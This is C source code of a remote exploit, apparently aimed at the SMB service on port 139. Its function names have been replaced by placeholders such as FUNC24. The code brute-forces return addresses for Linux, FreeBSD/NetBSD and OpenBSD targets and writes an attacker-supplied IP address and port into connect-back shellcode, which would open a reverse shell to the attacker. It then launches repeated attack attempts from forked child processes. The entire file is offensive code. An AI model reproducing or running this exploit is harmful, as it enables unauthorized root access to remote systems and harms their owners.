#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct stat {int dummy; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_addr; void* sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {int /*<<< orphan*/  h_length; int /*<<< orphan*/  h_addr; } ;
typedef  int /*<<< orphan*/  addr1 ;
typedef  void* a_port ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  GoAway ; 
 scalar_t__ LOOP ; 
 scalar_t__ SIGUSR2 ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int FUNC0 (char*) ; 
 char* bsd_connect_back ; 
 int* childs ; 
 int client ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int FUNC2 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (int,unsigned long,char*) ; 
 int /*<<< orphan*/  FUNC5 (int,unsigned long,char*) ; 
 scalar_t__ exploit_pid ; 
 int FUNC6 () ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ ,char*,...) ; 
 struct hostent* FUNC8 (char*) ; 
 scalar_t__ FUNC9 () ; 
 void* FUNC10 (int) ; 
 scalar_t__ FUNC11 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC12 (scalar_t__,scalar_t__) ; 
 char* linux_connect_back ; 
 scalar_t__ listen_pid ; 
 int /*<<< orphan*/  FUNC13 (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int port_listen ; 
 int /*<<< orphan*/  FUNC14 (scalar_t__,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC15 (int) ; 
 int sock_listen ; 
 int FUNC16 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC17 (char*,char*,int*,int*,int*,int*) ; 
 int /*<<< orphan*/  FUNC18 () ; 
 int /*<<< orphan*/  FUNC19 (int) ; 
 int FUNC20 (char*,struct stat*) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 int /*<<< orphan*/  FUNC21 (char*) ; 
 int /*<<< orphan*/  FUNC22 (int) ; 
 int /*<<< orphan*/  FUNC23 (int*) ; 

int
FUNC24 (int argc,char *argv[])
{
   char *shellcode = NULL;
   int typeos	= -1;
   int port		= 139;
   int sock		= 0;
   int i		= 0;
   int status	= 0;
   int m		= 0;
   int ip1		= 0;
   int ip2		= 0;
   int ip3		= 0;
   int ip4		= 0;
   int sta		= 0;
   int STEPS	= 512;
   int ENDLOOP    = 64;
   char *desc; 
   unsigned long MAX_CHILDS  = 40;
   unsigned long ret         = 0x0;
   unsigned short int  a_port;
   struct sockaddr_in addr1;
   struct hostent *he;
   struct stat st;
   
      if (argc != 4) FUNC21(argv[0]);
   
      typeos = FUNC0(argv[1]);
      if (typeos > 3) {
          FUNC7(stdout, "Os type out of list!\n");
          FUNC3(1);
      }

      he = FUNC8(argv[2]);

      if (he == NULL) {
          FUNC7(stderr, "Unable to resolve\n");
          return -1;
      }

      listen_pid = FUNC9();
      FUNC18();
      exploit_pid = listen_pid + 1;

      //fprintf(stdout, "[+] Listen pid: %d, exploit pid: %d\n", listen_pid,exploit_pid);

      FUNC17(argv[3], "%d.%d.%d.%d", &ip1, &ip2, &ip3, &ip4);		
      linux_connect_back[171] = ip1; bsd_connect_back[162] = ip1;
      linux_connect_back[172] = ip2; bsd_connect_back[163] = ip2;
      linux_connect_back[173] = ip3; bsd_connect_back[164] = ip3;
      linux_connect_back[174] = ip4; bsd_connect_back[165] = ip4;
				
      FUNC7(stdout, "[+] Connecting back to: [%d.%d.%d.%d:%d]\n", 
					ip1, ip2, ip3, ip4, port_listen);

      a_port = FUNC10(port_listen);
      
      linux_connect_back[177]= (a_port) & 0xff;
      linux_connect_back[178]= (a_port >> 8) & 0xff;
      bsd_connect_back[168]= (a_port) & 0xff;
      bsd_connect_back[169]= (a_port >> 8) & 0xff;

      switch(typeos) {
      case 0:
              desc = "Linux";
              ret = 0xc0000000;
              shellcode = linux_connect_back;
              break;
      case 1:
              desc = "FreeBSD/NetBSD";
              ret = 0xbfc00000;
              shellcode = bsd_connect_back;
              break;
      case 2:
              desc = "OpenBSD 3.1 and prior";
              ret = 0xdfc00000;
              shellcode = bsd_connect_back;
              break;
      case 3:
              desc = "OpenBSD 3.2 non-exec stack";
              ret = 0x00170000;
              shellcode = bsd_connect_back;
              break;
      }

      FUNC7(stdout, "[+] Target: %s\n", desc);
      FUNC13(&addr1.sin_addr, he->h_addr, he->h_length);

      addr1.sin_family = AF_INET;
      addr1.sin_port	 = FUNC10(port);	

      FUNC7(stdout, "[+] Connected to [%s:%d]\n", (char *)FUNC11(addr1.sin_addr), port);
      FUNC7(stdout, "[+] Please wait in seconds...!\n");

      FUNC14(SIGUSR2, GoAway);
   
      for (i = 0; i < 50; i++) childs[i] = -1;
      i = 0; m = 0;

      while (LOOP) {

           if ((sock = FUNC16(AF_INET, SOCK_STREAM, 6)) < 0) {
              FUNC7(stderr, "[+] socket() error.\n");
              FUNC3(-1);
           }

           ret -= STEPS; i++;
           if ((ret & 0xff) == 0x00 && typeos != 3) ret++;             

           m++; 
           //fflush(0);
           //fprintf(stdout, "[+] Return Address: 0x%08x [%02d]\n", (unsigned int)ret, m);

           FUNC22(150000);

           switch (childs[i] = FUNC6()) {
           case 0:  
                  if (FUNC2(sock, (struct sockaddr *)&addr1, sizeof(addr1)) == -1) { 
                      //fprintf(stderr, "[+] connect() error.\n");
                      FUNC1(sock);
                      FUNC3(-1);
                  }
			
                 FUNC19(sock);
                 FUNC15(3);
		     		         
                 if (typeos != 3) {
                           if (FUNC4(sock, ret, shellcode) < 0) {
                              //fprintf(stderr, " -> Failed.\n");
                              FUNC1(sock);
                              FUNC3(-1);
                           }
                 } else {
                           if (FUNC5(sock, ret, shellcode) < 0) {
                              //fprintf(stderr, " -> Failed.\n");
                              FUNC1(sock);
                              FUNC3(-1);
                           }
                  }
                  FUNC15(5);
                  FUNC1(sock);
                  FUNC3(0);
                  break;
           case -1:
                  FUNC3(-1);
                  break;
           default:
                  if (i > MAX_CHILDS - 2) {
                      FUNC23(&status);
                      i--;
                  }
                  break;
           } 

           if (m == ENDLOOP) LOOP = 0;
      } 	   

      if (FUNC20(".ROOT", &st) != -1) 
         FUNC12(SIGUSR2, listen_pid);
      else {	
           FUNC7(stdout, "[+] Dohh, exploit failed.\n");
	   FUNC1(client); FUNC1(sock_listen);
           FUNC12(listen_pid, SIGUSR2);
	   FUNC15(2);
	   FUNC3(0);
      }
}